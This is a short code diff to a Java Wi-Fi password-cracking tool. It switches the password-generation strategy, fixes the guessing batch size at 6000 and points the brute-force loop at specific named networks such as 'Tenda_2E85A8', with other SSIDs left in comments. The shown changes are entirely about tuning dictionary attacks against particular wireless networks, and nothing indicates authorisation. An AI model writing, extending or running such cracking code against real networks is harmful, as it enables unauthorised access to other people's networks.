@@ -38,8 +38,8 @@ public class Connector {
         int counter = 0;
         outer:
         while (true) {
-            int start = counter * FileConfig.PASSWORD_SIZE;
-            int end = (counter + 1) * FileConfig.PASSWORD_SIZE - 1;
+            int start = counter * 6000;
+            int end = (counter + 1) * 6000 - 1;
             passwordList = PasswordGeneretor.getPassword(generetor, start, end);
             if (passwordList != null && passwordList.size() > 0) {
                 for (int i = 0; i < passwordList.size(); i++) {
@@ -68,17 +68,20 @@ public class Connector {
      */
     public static void main(String[] args) {
         long start = System.currentTimeMillis();
+        Generetor generetor = Generetor.WAKE;
 //        Generetor generetor = Generetor.MOST_USE;
-        Generetor generetor = Generetor.FIRST_MOST_COUPLE;
+//        Generetor generetor = Generetor.FIRST_MOST_COUPLE;
 
 
-        String ssid = "TP-LINK_5410";
+        String ssid = "Tenda_2E85A8";
+//        String ssid= "HUAWEI_P9_ZW";
+//        String ssid = "TP-LINK_5410";
 //        String ssid = "ChinaNet-WWS2";
 
         // step1
 //        genPassword(generetor);
         // step2
-//        genProfile(ssid, generetor);
+        genProfile(ssid, generetor);
         // step3
         String password = check(ssid, generetor);
 
